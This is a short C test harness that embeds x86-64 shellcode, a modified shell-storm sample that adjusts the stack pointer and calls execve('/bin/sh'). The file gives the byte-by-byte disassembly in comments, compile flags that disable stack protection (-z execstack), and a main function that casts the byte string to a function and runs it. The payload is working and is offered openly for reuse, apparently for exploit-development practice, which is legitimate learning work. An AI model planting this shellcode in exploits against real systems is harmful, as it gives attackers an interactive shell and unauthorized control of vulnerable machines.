// modified shellcode to add to rsp and call execve("/bin/sh")
// original reference: http://shell-storm.org/shellcode/files/shellcode-806.php

// compile and test with:
// gcc test_shellcode1.c -z execstack -o test_shellcode1
// ./test_shellcode1

// 48 83 c4 40             add    rsp,0x40
// 31 c0                   xor    eax,eax
// 48 bb d1 9d 96 91 d0    movabs rbx,0xff978cd091969dd1
// 8c 97 ff
// 48 f7 db                neg    rbx
// 53                      push   rbx
// 54                      push   rsp
// 5f                      pop    rdi
// 99                      cdq
// 52                      push   rdx
// 57                      push   rdi
// 54                      push   rsp
// 5e                      pop    rsi
// b0 3b                   mov    al,0x3b
// 0f 05                   syscall

#include <stdio.h>
#include <string.h>

char shellcode[] = "\x48\x83\xc4\x40\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main() {
    printf("len:%ld bytes\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
